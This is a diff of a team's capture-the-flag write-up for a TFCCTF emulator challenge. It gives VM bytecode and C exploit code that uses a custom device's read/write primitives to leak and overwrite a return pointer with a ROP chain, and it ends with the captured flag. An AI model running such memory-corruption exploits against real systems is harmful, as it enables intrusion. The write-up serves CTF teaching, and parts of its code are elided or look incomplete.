@@ -301,36 +301,42 @@ If we check our analysis of `vm_execute`, we can see that we have arbitrary read
 
 ### Exploit
 
-We stored vm
-
-we created 2 vm programs
-First shellcode is
-
+We created 2 vm programs
+First shellcode is  
 ```
 opc_load r1, r0
 opc_ret
 ```
-
-we used
+we used 
 `pciwrite(0x50, 0x100000 + 0x28)` we set register 0 to return pointer offset
 and called pciwrite(0x128, 1); to execute vm.
 
 Next we read register1 using pciread(0x58); to get return pointer leak.
 
 next vm program is to set return pointer to some ret instruction to allign stack and next rop is to win function
-
 ```
 opc_store r1, r0
 opc_store r3, r2
 opc_ret
 ```
-
-we just had to store register r1 to our chosen ret instruction and
+we just had to store register r1 to our chosen ret instruction and 
 r3 to win function addres generated from leaked function.
+And stack offsets to registers r0 and r2.
 
-Full code can be found at: [write_shellcode]()
+Full code can be found at: [exploit](./exploit/edu-cli.c)
+
 
 ```c
+#include <fcntl.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include "edu.h"
+#include <stdint.h>
+
 #define SHELLCODE_LEN 128
 uint8_t shellcode[SHELLCODE_LEN] = {0, 17, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 17, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
 
@@ -339,12 +345,77 @@ uint8_t shellcode1[SHELLCODE_LEN1] = {0, 33, 32, 35, 0, 0, 0, 0, 0, 0, 0, 0, 0, 
 
 
 #define CHECKSUM_LEN 18176
-uint8_t checksum[CHECKSUM_LEN] = { /*magic blob*/}
+uint8_t checksum[CHECKSUM_LEN] = { /*magic blob*/};
 
-void write_shellcode()
+
+static const char *const device_path = "/dev/edu";
+
+static bool parse_int_arg(const char *s, unsigned long long int *val)
 {
-	// fist part
-	printf("starting shellcode\n");
+	const bool is_hex = s[0] == '0' && (s[1] == 'x' || s[1] == 'X');
+	return sscanf(s, is_hex ? "%llx" : "%llu", val) == 1;
+}
+
+int fd;
+int ret;
+
+uint64_t pciread(uint64_t address)
+{
+	uint64_t addr = address;
+	uint64_t val = 0;
+	ret = ioctl(fd, EDU_IOCTL_IDENT, &addr);
+	if (ret) {
+		printf("read ioctl error\n");
+		exit(-1);
+	}
+	return val;
+}
+
+uint64_t pciwrite(uint64_t address, uint64_t value)
+{
+	uint64_t addr = address;
+	uint64_t val = value;
+	ret = ioctl(fd, EDU_IOCTL_LIVENESS, &addr);
+	if (ret) {
+		printf("write ioctl error\n");
+	}
+	return val;
+}
+
+uint64_t set_fw_w_addr(uint64_t value)
+{
+	return pciwrite(0x120, value);
+}
+
+uint64_t set_fw_len(uint64_t value)
+{
+	return pciwrite(0x138, value);
+}
+
+uint64_t write_byte(uint64_t value)
+{
+	return pciwrite(0xd8, value);
+}
+
+void write_checksum()
+{
+	set_fw_len(0x10000);
+	for (size_t i = 0; i < CHECKSUM_LEN; i += 8) {
+		set_fw_w_addr(0x4000 + i);
+		write_byte(*(uint64_t *)&checksum[i]);
+	}
+}
+
+#define SHELLCODE_LEN 128
+uint8_t shellcode[SHELLCODE_LEN] = {0, 17, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 17, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
+
+#define SHELLCODE_LEN1 128
+uint8_t shellcode1[SHELLCODE_LEN1] = {0, 33, 32, 35, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 33, 32, 35, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
+
+
+void exploit()
+{
+	write_checksum();
 
 	for (size_t i = 0; i < SHELLCODE_LEN; i += 8)
 	{
@@ -357,7 +428,7 @@ void write_shellcode()
 	pciwrite(0x128, 1);
 
 	uint64_t leak = pciread(0x58);
-	printf("Return pointer leak = %llx\n", (unsigned long long int)leak);
+	printf("firmware [] = %llx\n", (unsigned long long int)leak);
 
 	// second part
 	uint64_t offset_ret = 0xffffffffffda7e23;
@@ -376,4 +447,10 @@ void write_shellcode()
 }
 ```
 
-### Final Exploit
+And in the end we transfered out driver and cli tool and we got the flag ```TFCCTF{7h4nk_y0u_c4d37_y0u_w0n_7h3_3mu_w4r_92u83cj545d}```
+
+
+![Flag](flag.png)
+
+## Post Mortem
+Thanks TFC for awesome challenge for another year. this challenge involved a four team members of CyberHero. We would love to see more challenges like these in next CTF.
